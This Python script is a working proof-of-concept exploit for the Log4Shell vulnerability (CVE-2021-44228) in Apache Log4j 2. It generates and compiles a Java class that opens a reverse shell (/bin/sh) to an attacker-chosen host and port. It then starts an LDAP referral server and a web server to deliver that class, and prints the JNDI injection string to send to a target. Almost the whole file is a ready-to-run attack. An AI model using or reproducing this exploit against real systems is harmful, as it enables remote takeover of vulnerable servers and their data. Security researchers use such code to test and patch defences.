#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import sys
import textwrap
import threading
import subprocess
import fire
from loguru import logger

from http.server import HTTPServer, SimpleHTTPRequestHandler

java_path = "./jdk1.8.0_20/bin/java"
javac_path = "./jdk1.8.0_20/bin/javac"
exp_java_file_path = "./Exploit.java"
snapshot = "target/marshalsec-0.0.3-SNAPSHOT-all.jar"
ldap_ref_server = "marshalsec.jndi.LDAPRefServer"


class ApacheLog4j2(object):
    """
    CVE: CVE-2021-44228 - Apache Log4j 2 - PoC
    Versions: 2.0-beta-9, 2.14.1
    Exploit Authors: kozmer, z9fr, svmorris

    Reference:
        https://www.exploit-db.com/exploits/50592
        https://github.com/kozmer/log4j-shell-poc
        https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
        https://github.com/apache/logging-log4j2
        https://logging.apache.org/log4j/2.x/
    """
    def __init__(self, userip = 'localhost', webport = 8000, lport = 9001):
        """
        Args:
            userip(str) : Enter IP for LDAPRefServer & Shell (default is localhost)
            webport(int) : Enter port for HTTP server (default is 8000)
            lport(int) : Enter port for Log4j2 server (default is 9001)
        """
        self.userip = userip
        self.webport = webport
        self.lport = lport

    def check_java(self) -> bool:
        cmd = [java_path, '-version']
        exit_code = subprocess.call(cmd, stderr = subprocess.DEVNULL, stdout = subprocess.DEVNULL)
        if exit_code != 0:
            logger.error('Java is not installed inside the repository')
            return False
        return True

    def generate_payload(self, userip, lport) -> None:
        java_program = textwrap.dedent("""\
            import java.io.IOException;
            import java.io.InputStream;
            import java.io.OutputStream;
            import java.net.Socket;

            public class Exploit {
                public Exploit() throws Exception {
                    String host="%s";
                    int port=%s;
                    String cmd="/bin/sh";
                    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
                    Socket s=new Socket(host,port);
                    InputStream pi=p.getInputStream(),
                        pe=p.getErrorStream(),
                        si=s.getInputStream();
                    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
                    while(!s.isClosed()) {
                        while(pi.available()>0)
                            so.write(pi.read());
                        while(pe.available()>0)
                            so.write(pe.read());
                        while(si.available()>0)
                            po.write(si.read());
                        so.flush();
                        po.flush();
                        Thread.sleep(50);
                        try {
                            p.exitValue();
                            break;
                        }
                        catch (Exception e){
                        }
                    };
                    p.destroy();
                    s.close();
                }
            }
        """ % (userip, lport))
        
        # writing the exploit to Exploit.java file
        try:
            cmd = [javac_path, exp_java_file_path]
            with open(exp_java_file_path, "w") as f:
                f.write(java_program)
            subprocess.run(cmd)
            logger.info("Exploit java class created success")
        except Exception as e:
            logger.error(f"Something went wrong {e}")

    def ldap_server(self, userip, lport) -> None:
        ldap_port = 1389
        sendme = "${jndi:ldap://%s:%s/a}" % (userip, ldap_port)
        logger.info(f"Send me: {sendme}")
        url = f"http://{userip}:{lport}/#Exploit"
        cmd = [java_path, "-cp", snapshot, ldap_ref_server, url]
        subprocess.run(cmd)

    def apache_log4j2_poc(self, userip, webport, lport):
        if not self.check_java():
            sys.exit(1)
        self.generate_payload(userip, lport)

        logger.info("Setting up LDAP server")
        # create the LDAP server on new thread
        t1 = threading.Thread(target = self.ldap_server, args = (userip, webport))
        t1.start()

        # start the web server
        logger.info(f"Starting Webserver http://{userip}:{webport}")
        httpd = HTTPServer((userip, webport), SimpleHTTPRequestHandler)
        httpd.serve_forever()

    def main(self):
        self.apache_log4j2_poc(self.userip, self.webport, self.lport)

if __name__ == "__main__":
    fire.Fire(ApacheLog4j2)
